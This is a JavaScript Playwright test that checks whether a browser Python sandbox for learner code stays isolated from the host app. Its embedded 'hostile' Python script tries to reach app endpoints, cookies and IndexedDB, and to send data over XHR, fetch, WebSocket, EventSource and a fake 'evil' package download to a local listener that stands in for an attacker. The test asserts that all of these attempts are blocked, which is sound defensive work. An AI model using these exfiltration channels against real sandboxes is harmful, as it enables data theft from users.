// Runner isolation probe (docs/python/runner-isolation.md): learner code runs in the opaque-origin sandbox
// runner and tries to reach the app's storage, cookies, endpoints and the network. Everything must fail,
// while ordinary programs, libraries and dataset mounts still work.
// Usage: npm run dev -- -p 3041 & BASE=http://localhost:3041 node tests/e2e/python-isolation.mjs [chromium|firefox|webkit]
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { chromium, firefox, webkit } from "playwright";

const BASE = process.env.BASE ?? "http://localhost:3041";
const engines = { chromium, firefox, webkit };

// A listener standing in for an attacker's server. Some network APIs (WebSocket, fetch, EventSource) are
// refused asynchronously, so the proof is that nothing ever arrives here, not that a call threw.
const EXFIL_PORT = 3043;
const hits = [];
const exfil = createServer((req, res) => { hits.push(`${req.method} ${req.url}`); res.setHeader("Access-Control-Allow-Origin", "*"); res.end("leaked"); });
exfil.on("upgrade", (req, socket) => { hits.push(`UPGRADE ${req.url}`); socket.destroy(); });
await new Promise((resolve) => exfil.listen(EXFIL_PORT, "127.0.0.1", resolve));
const EXFIL = `http://127.0.0.1:${EXFIL_PORT}`;
const names = process.argv.slice(2).length ? process.argv.slice(2) : ["chromium", "firefox", "webkit"];

// Learner code. Synchronous XHR works in workers, so each attempt reports right away.
// The js.eval / js.Function attempts check that CSP blocks string-to-code in the runner; they must fail.
const HOSTILE = String.raw`
import js
results = {}
def attempt(name, fn):
    try:
        results[name] = "reached: " + str(fn())[:80]
    except BaseException as e:
        results[name] = "blocked: " + type(e).__name__

def xhr(url, method="GET"):
    r = js.XMLHttpRequest.new()
    r.open(method, url, False)
    r.withCredentials = True
    r.send()
    return str(r.status) + " " + str(r.responseText)[:40]

attempt("app page", lambda: xhr("${BASE}/"))
attempt("app api", lambda: xhr("${BASE}/api/notify-interest", "POST"))
attempt("app dataset", lambda: xhr("${BASE}/datasets/python/R01/preview.1/orders.csv"))
attempt("other site", lambda: xhr("https://example.com/"))
attempt("indexedDB", lambda: js.indexedDB.open("probe"))
attempt("exfil xhr", lambda: xhr("${EXFIL}/xhr"))
# Fire-and-forget channels: these may not throw; the listener proves whether anything left.
attempt("exfil websocket", lambda: js.WebSocket.new("ws://127.0.0.1:${EXFIL_PORT}/ws"))
attempt("exfil fetch", lambda: js.fetch("${EXFIL}/fetch?secret=1"))
attempt("exfil eventsource", lambda: js.EventSource.new("${EXFIL}/es"))
import pyodide_js
attempt("exfil loadPackage", lambda: pyodide_js.loadPackage("${EXFIL}/evil-1.0-py3-none-any.whl"))
attempt("eval", lambda: js.eval("1 + 1"))
attempt("Function", lambda: js.Function.new("return 1")())
attempt("cookie via worker", lambda: js.document.cookie)
attempt("origin", lambda: js.location.origin)
attempt("pyodide folder", lambda: xhr("${BASE}/runner/pyodide/314.0.7/pyodide-lock.json"))
import json
print(json.dumps(results))
`;

async function probe(name) {
  const browser = await engines[name].launch();
  const page = await browser.newPage();
  const logs = [];
  page.on("console", (m) => logs.push(m.text()));
  page.on("pageerror", (e) => logs.push(String(e)));
  await page.goto(`${BASE}/`);
  await page.evaluate(async () => {
    localStorage.setItem("probe-secret", "app-secret");
    document.cookie = "probe_cookie=app-cookie; path=/";
    await new Promise((resolve, reject) => {
      const req = indexedDB.open("probe-app", 1);
      req.onupgradeneeded = () => req.result.createObjectStore("s");
      req.onsuccess = () => { req.result.close(); resolve(); };
      req.onerror = () => reject(req.error);
    });
  });

  const csv = "order_id,total\nO1,9.99\n";
  const run = async (code, { packages = "", mounts = [], linger = 0 } = {}) =>
    page.evaluate(async ({ code, packages, mounts, linger }) => {
      const frame = document.createElement("iframe");
      frame.setAttribute("sandbox", "allow-scripts");
      frame.style.display = "none";
      frame.src = `/python-sandbox${packages ? `?packages=${packages}` : ""}`;
      const out = { stdout: "", stderr: "", result: null, error: null };
      const finished = new Promise((resolve) => {
        const timer = setTimeout(() => resolve("timeout"), 90000);
        addEventListener("message", (e) => {
          if (e.source !== frame.contentWindow || !e.data?.__pyRunner) return;
          const d = e.data.data;
          if (d.__runnerError) { out.error = d.__runnerError; clearTimeout(timer); resolve("error"); }
          if (d.type === "boot-error") { out.error = d.message; clearTimeout(timer); resolve("boot-error"); }
          if (d.type === "ready") {
            frame.contentWindow.postMessage({ __pyRunner: true, data: { type: "run", id: 1, nonce: "n", code, stdin: "", outputLimit: 50000, mounts: mounts.map((m) => ({ path: m.path, bytes: new TextEncoder().encode(m.text).buffer })) } }, "*");
          }
          if (d.type === "output" && d.nonce === "n") out[d.stream] += d.text;
          if (d.type === "done" && d.nonce === "n") { out.result = d.result; clearTimeout(timer); resolve("done"); }
        });
      });
      document.body.append(frame);
      out.end = await finished;
      // Keep the runner alive so asynchronous connections have time to land if they were allowed.
      await new Promise((r) => setTimeout(r, linger));
      frame.remove();
      return out;
    }, { code, packages, mounts, linger });

  const report = { engine: name };
  const hostile = await run(HOSTILE, { linger: 4000 });
  assert.equal(hostile.end, "done", `${name}: hostile run didn't finish: ${hostile.end} ${hostile.error ?? ""} ${hostile.stderr}\n${logs.slice(-8).join("\n")}`);
  report.attempts = JSON.parse(hostile.stdout.split("\n").find((l) => l.startsWith('{"app page"')));
  report.otherOutput = hostile.stdout.split("\n").filter((l) => l && !l.startsWith('{"app page"'));
  for (const key of ["app page", "app api", "app dataset", "other site", "exfil xhr", "indexedDB", "eval", "Function", "cookie via worker"]) {
    assert.match(report.attempts[key], /^blocked/, `${name}: learner code reached ${key}: ${report.attempts[key]}`);
  }
  assert.doesNotMatch(report.attempts.origin, new RegExp(BASE.replace(/[.:/]/g, "\\$&")), `${name}: runner shares the app origin`);

  // Give asynchronous channels time to try, then check nothing reached the listener.
  await page.waitForTimeout(3000);
  report.exfilHits = hits.splice(0);
  assert.deepEqual(report.exfilHits, [], `${name}: data left the runner: ${report.exfilHits.join(", ")}`);

  // Ordinary programs, dataset mounts and libraries still work.
  const plain = await run("print(sum(range(10)))");
  assert.equal(plain.stdout, "45\n");
  const mounted = await run("print(open('data/orders.csv').read(), end='')", { mounts: [{ path: "data/orders.csv", text: csv }] });
  assert.equal(mounted.stdout, csv);
  const numpy = await run("import numpy as np\nprint(int(np.arange(5).sum()))", { packages: "numpy" });
  assert.equal(numpy.stdout, "10\n", `${name}: numpy failed: ${numpy.error ?? numpy.stderr}`);

  // The app's own data is untouched.
  report.appStorage = await page.evaluate(() => localStorage.getItem("probe-secret"));
  assert.equal(report.appStorage, "app-secret");
  await browser.close();
  return report;
}

const reports = [];
for (const name of names) {
  try {
    reports.push(await probe(name));
    console.log(`ok ${name}`);
  } catch (err) {
    reports.push({ engine: name, failed: String(err.message ?? err) });
    console.log(`FAIL ${name}: ${err.message ?? err}`);
  }
}
exfil.close();
console.log(JSON.stringify(reports, null, 2));
if (reports.some((r) => r.failed)) process.exit(1);
